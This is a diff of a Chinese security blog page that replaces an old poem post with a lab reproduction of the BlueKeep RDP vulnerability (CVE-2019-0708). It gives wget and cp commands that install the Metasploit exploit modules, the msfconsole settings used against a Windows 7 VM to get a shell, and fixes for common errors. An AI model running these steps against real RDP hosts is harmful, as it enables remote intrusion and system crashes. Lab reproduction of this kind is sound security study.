@@ -6,20 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://geeeez.github.io">
-  <title>传信者 | geez博客</title>
+  <title>MS2019_0708复现笔记 | geez博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="传信者">
-<meta name="keywords" content="随笔">
+  <meta name="description" content="反弹shell">
+<meta name="keywords" content="内网安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="传信者">
-<meta property="og:url" content="https://geeeez.github.io/1997/01/01/传信者/index.html">
+<meta property="og:title" content="MS2019_0708复现笔记">
+<meta property="og:url" content="https://geeeez.github.io/2019/09/07/MS-2019_0708复现笔记/index.html">
 <meta property="og:site_name" content="geez博客">
-<meta property="og:description" content="传信者">
+<meta property="og:description" content="反弹shell">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-26T03:23:06.748Z">
+<meta property="og:image" content="https://geeeez.github.io/images/1568125420978.png">
+<meta property="og:image" content="https://geeeez.github.io/images/1568126952731.png">
+<meta property="og:image" content="https://geeeez.github.io/images/1568126937511.png">
+<meta property="og:updated_time" content="2019-09-10T14:58:47.175Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="传信者">
-<meta name="twitter:description" content="传信者">
+<meta name="twitter:title" content="MS2019_0708复现笔记">
+<meta name="twitter:description" content="反弹shell">
+<meta name="twitter:image" content="https://geeeez.github.io/images/1568125420978.png">
   
     <link rel="alternative" href="/atom.xml" title="geez博客" type="application/atom+xml">
   
@@ -177,27 +181,53 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-传信者" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-MS-2019_0708复现笔记" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      传信者
+      MS2019_0708复现笔记
     </h1>
   
 
         
-        <a href="/1997/01/01/传信者/" class="archive-article-date">
-  	<time datetime="1996-12-31T16:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>1997-01-01</time>
+        <a href="/2019/09/07/MS-2019_0708复现笔记/" class="archive-article-date">
+  	<time datetime="2019-09-07T12:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-07</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>我本想托月亮带话给你<br>但今夜无月<br>我又等不到太阳出来<br>只能托这清风<br>又怕你在屋里<br>只能多多嘱咐清风<br>让他万万要吹到屋里<br>吹在你的耳边</p>
+        <h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><p>windows7：<br><img src="/images/1568125420978.png" alt="1568125420978"></p>
+<p>kali2019：这里就不截图了，就是kali2019，因为听说msf的版本必须大于5.0，懒得升级直接重装kali</p>
+<p>备注：windows7 目前只能复现旗舰版的sp1 如果总是遇见蓝屏请把win7虚拟机调成2G2核。另外安装虚拟机的时候记得选择ultimate，否则虚拟机默认安装家庭版，这个很重要。</p>
+<a id="more"></a>
+<h4 id="先搞好MSF"><a href="#先搞好MSF" class="headerlink" title="先搞好MSF"></a>先搞好MSF</h4><p>首先我们要下载网上的msf rb脚本，我这里是从github一个老哥那儿下载的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure>
+
+<p>网上还有另一个脚本下载地址：<a href="https://github.com/backlion/demo/raw/master/CVE-2019-0708_RDP%20_MSF.zip" target="_blank" rel="noopener">https://github.com/backlion/demo/raw/master/CVE-2019-0708_RDP%20_MSF.zip</a> 这里的这个我也用了，但是一直不成功，后来我就去下载了上面的那个。也可能是我没搞好路径覆盖吧，我还是推荐用我下载的那个。  </p>
+<p>下面就是把上面下载的四个脚本放进msf，如果你是自己安装的msf，你的msf 应该在/opt 目录下，如果是自带的应该在/usr/share/<br>我的是自带的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">替换文件：</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb   替换  /usr/share/metasploit</span><br><span class="line">framework/modules/exploit/windows/rdp/</span><br><span class="line"></span><br><span class="line">rdp.rb   替换  /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb 替换  /usr/share//metasploit</span><br><span class="line">framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit</span><br><span class="line">framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure>
+
+<p>如果你是自己下载的，同理：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/</span><br><span class="line"></span><br><span class="line">cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果这里没有rdp目录，就创建一个rdp目录</span></span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/rdp/</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure>
+
+<h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><p>首先保证能ping通win7 虚拟机（靶机），然后关闭win7的防火墙（没错，目前就是这么鸡肋），开启win7的远程桌面，这个就不用教了吧。<br>靶机：192.168.26.159<br>攻击机：192.168.26.180<br>开启msfconsole，执行 reload_all。<br>然后  search cve_2019_0708_bluekeep_rce 看看是否覆盖进去了。<br>紧接着 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 加载模块，然后设置三个参数：<br>RHOSTS 靶机ip<br>RPORT rdp端口<br>target ID数字(可选为0-4)设置受害机机器架构<br>PS：我是set target 3 成功的</p>
+<p>千万不要自作聪明去改RDP_CLIENT_IP 这个默认就行。<br>然后就是 run 这个时候你就可以看到蓝屏或者就是shell回来了：<img src="/images/1568126952731.png" alt="1568126952731"></p>
+<p>蓝屏不要紧，蓝屏很正常，再试几次。</p>
+<p><img src="/images/1568126937511.png" alt="1568126937511"></p>
+<p>上面我们成功返回shell，当然中间可能还会各种遇到报错，所以你也遇到了请接着往下看</p>
+<h4 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h4><p>1、如果报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exploit failed: NameError undefined local variable ormethod rdp_ connect&apos; for #&lt;Msf : :Modules: :Exploit__ Rdp_ Cve_ 2019 0708 bluekeep_ rce: :Metasploi tModule : 0x000000000f 702b78&gt;</span><br></pre></td></tr></table></figure>
+
+<p>说明你的四个payload文件没有覆盖到正确的位置，请一一确认，这个问题不解决是绝对不可能打过去的<br>2、如果报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+
+<p>恭喜你，打过去了，但是大概率是蓝屏了，如果蓝屏说明你是对的再多试几次，并且更换target多试几次，确实很大几率是蓝屏。如果没有蓝屏但是也报错如上，那么就是你的虚拟机版本的问题，请确认 关闭防火墙、开启3389 版本 window7 sp1 版本。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前这个0708漏洞算是可以利用了，但是仍需要大佬开发更稳定的脚本出来，而我是搞web的，我根本改不动这个东西，看来以后得多学学逆向了。</p>
 
       
 
@@ -242,7 +272,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网安全</a>
         		</li>
       		
 		</ul>
@@ -298,7 +328,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/1997/01/01/传信者/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/2019/09/07/MS-2019_0708复现笔记/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -312,18 +342,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/08/03/博客搬迁/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          我的博客再次上线
-        
-      </div>
-    </a>
   
-  
-    <a href="/1997/01/01/渴望/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">深夜12点</div>
+    <a href="/2019/08/01/CTF中的sql注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CTF中的sql注入总结</div>
       <i class="icon-circle-right"></i>
     </a>
   
